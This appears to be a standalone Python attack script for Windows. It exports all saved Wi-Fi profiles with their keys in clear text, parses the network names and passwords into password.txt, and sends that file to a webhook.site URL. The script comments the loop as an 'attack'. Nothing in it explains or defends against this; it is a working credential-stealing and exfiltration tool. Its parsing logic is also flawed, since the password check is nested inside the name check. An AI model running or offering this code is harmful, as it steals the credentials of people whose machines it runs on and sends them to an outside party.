import subprocess
import os
import sys
import requests
#url
url='https://webhook.site/e7494adc-a913-450c-990d-19c2dc7e9db3'
#create a file
key_file= open('password.txt', 'w')
key_file.write("Michael, These are your passwords:\n\n")
key_file.close()

#lists
wifi_doc=[]
wifi_name=[]
wifi_key=[]

#use python to execute a windows command
command=subprocess.run(["netsh", "wlan","export", "profile", "key=clear"], capture_output=True).stdout.decode()
#get current directory
path=os.getcwd() 

#attack!
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_doc.append(filename)
        for i in wifi_doc:
            with open(i, "r") as file:
                for line in file.readlines():
                    if 'name' in line:
                        stripped=line.strip()
                        front =stripped[6:]
                        back=front[:-7]
                        wifi_name.append(back)
                        if 'keyMaterial' in line:
                            stripped=line.strip()
                            front=stripped[13:]
                            back=front[:-14]
                            wifi_key.append(back)
                            for x, y in zip(wifi_name, wifi_key):
                                sys.stdout=open("password.txt", "a")
                                print("SSID: "+x, "Password: "+y, sep='\n')
                                sys.stdout.close()
                                
#send data to url webhook.site
with open('password.txt', 'rb') as file:
    req=requests.post(url, data=file)